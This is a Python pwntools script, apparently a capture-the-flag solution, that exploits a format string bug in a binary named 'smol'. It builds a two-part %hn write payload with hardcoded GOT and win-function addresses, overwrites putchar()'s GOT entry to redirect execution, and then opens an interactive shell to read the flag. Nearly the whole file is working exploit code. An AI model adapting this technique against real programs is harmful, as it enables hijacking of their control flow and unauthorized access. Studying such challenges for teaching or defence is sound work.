#!/usr/bin/env python3
# pylint: skip-file
"""
Format string exploit that overwrites the GOT entry of putchar() with the
address of a get_flag() function.

Helpful format string reference:
https://axcheron.github.io/exploit-101-format-strings/
"""

from pwn import *

NAME = 'smol'
PORT = 5004
URL = '172.17.0.1'
FLAGFILE = 'flag'

context.binary = ELF(NAME)

WIN_ADDR = 0x401349
PUTCHAR_GOT_ADDR = 0x404018
PAD_LEN = 112


def main():

    if args['REMOTE']:
        p = remote(URL, PORT)
    else:
        write(FLAGFILE, 'THIS_IS_THE_FLAG' * 4 + '\n')  # Create fake flag file
        p = process(context.binary.path)

    # Target addresses of 2x 2 byte writes.
    target_addr = p64(PUTCHAR_GOT_ADDR + 2) + p64(PUTCHAR_GOT_ADDR)
    target_value_hi = 0x0040    # High two bytes of  WIN_ADDR
    target_value_lo = 0x1349    # Low two bytes of WIN_ADDR
    padding = b'a' * (PAD_LEN - len(target_addr))

    # Format string that writes high value to address in argument position 6
    # and low value to address in argument position 7.
    payload = '%{hi}x%6$hn%{lo}x%7$hn'.format(
        hi=target_value_hi,
        lo=target_value_lo - target_value_hi).encode()

    # Send inputs to program.
    p.recvline()
    p.sendline(target_addr + padding + payload)
    p.recvline()
    p.recvline()
    p.sendline(b'hack the planet!!')

    # Interactively use the shell once exploit lands:
    # - $ cat flag.txt
    p.interactive()


if __name__ == '__main__':
    main()
